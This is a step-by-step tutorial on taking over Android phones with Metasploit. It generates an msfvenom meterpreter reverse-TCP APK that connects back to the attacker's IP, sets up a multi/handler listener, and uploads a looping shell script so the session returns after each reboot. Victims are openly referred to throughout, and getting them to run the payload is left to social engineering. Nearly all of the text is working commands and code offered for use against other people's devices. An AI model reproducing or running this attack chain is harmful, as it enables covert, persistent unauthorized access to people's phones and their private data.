# Android Hack & Persistence
## _How to take and keep control of an android device_

In this tutoriel, we will see how to create a payload for android phones and gain persistent access over the hacked system. 

We do not consider the part where you have to make the victim execute the payload, this is part of the social engineering course.

- Setup the environment 
- Create the payload using msfvenom
- Use msfconsole to setup a listener
- Gain /meterpreter> session over TCP
- Upload persistency script
- ✨Magic ✨

## Tutorial

### 1. Setup the environment
First, you have to find your public and private IP addresses. 
To do so, type the following in your terminal:

> Private IP
> ```sh
> ifconfig | grep "inet 192" | awk '{print $2}'
>```
The result of this command is you private IP.

> Public IP
>```sh
> curl ifconfig.me
>```
The result of this command is your public IP.

### 2. Creating the payload

You have to ask yourself the following question. Will you target be on the same network as you when they will execute the payload ? 

>If the answer is yes (ex: University Wi-Fi), then use you Private IP for the following step. Otherwise, use your public IP. 

Run the following command in you terminal:

>```sh
> msfvenom -p android/meterpreter/reverse_tcp LHOST={PRIVATE OR PUBLIC IP} -e x86/shikata_ga_nai -o  pwn_android.apk
> ```

> Note that the "-e x86/shikata_ga_nai" is OPTIONAL, it simply tells msfvenom to use a polymorphic XOR encoder

> Note that the "-o pwn_android.apk" is the name under wich the payload will be saved, you can choose what you want

Then, your payload should be saved under the named you choosed, in the directory in which you executed the command. 

## 3. Using Msfconsole

Fire-up msfconsole to setup the listener.The listener is the program that will be called over TCP by the payload when it has been executed by the victim on their device.

>In your terminal, type the following:
```sh
msfconsole
```
```sh
use exploit/multi/handler
```
```sh
set payload android/meterpreter/reverse_tcp
```
```sh
set LHOST {PRIVATE IP}
```
```sh
exploit
```

The listener is now switched on, if the victim executes the payload, you will acces a meterpreter session, and therefor, access the hacked android phone. 

### 4. Forging the persistence script

In another terminal, we are going to forge the persistence script. This script will allow us to pop a meterpreter sessions when the hacked device boots (even after reboot)

> In order to do do so, type the following:

```sh
nano pwn_persistent.sh 
```
> Make sure that you file as the .sh extention, it won't work otherwise.

When the editor pops'up type the following code:
> Make sure you respect the syntaxe.

```sh
#!/bin/bash
while :

do am start --user 0 -a android.intent.MAIN -n com.metasploit.stage/.MainActivity

sleep 20

done
```

Then, copy the generated file in you /root directory. You can do so by typing the following command:

```sh
cp pwn_persistent.sh /root
```

### 5. Upload the persistence script on the hacked device

When you have initiated the meterpreter session, i.e. when the victim executed the payload, you should have the following in you msfconsole:

```sh
meterpreter>
```
Next step is to upload the v2 script to the hacked device to obtain a persistent access. 

Our persistence script (pwn_persistent.sh) has to be placed in the /etc/init.d/ directory in order to be loaded up whenever the devices reboots.

To do so, in you meterpreter session, type:

```sh
cd /etc/init.d
```
```sh
upload pwn_persistent.sh
```

> It is probable that it wont work, which means the android phone you hacked previously is not "rooted"
> If it does not work, still in the meterpreter sessions, do:

```sh
shell
```

Then, in the new shell that should have poped up, do:
```sh
cd /
```
```sh
cd /sdcard/Downloads/
```
```sh
upload pwn_persistent.sh
```
> then execute the script by doing:

```sh
sh pwn_persistent.sh
```

You can now kill the shell buy doing:
> CTRL + C

## END

DONE, the device was hacked, now the hacking is persistent. When the phone reboots, you will still have access to the meterpreter session.

> If you pop msfconsole and do:

```sh
use exploit/multi/handler
```
```sh
set payload android/meterpreter/reverse_tcp
```
```sh
set LHOST {PRIVATE IP}
```
```sh
exploit
```
Then, the meterpreter session should pop-up properly (if the device is switched-on and has GSM connexion).

# ✨Enjoy and be careful UwU ✨
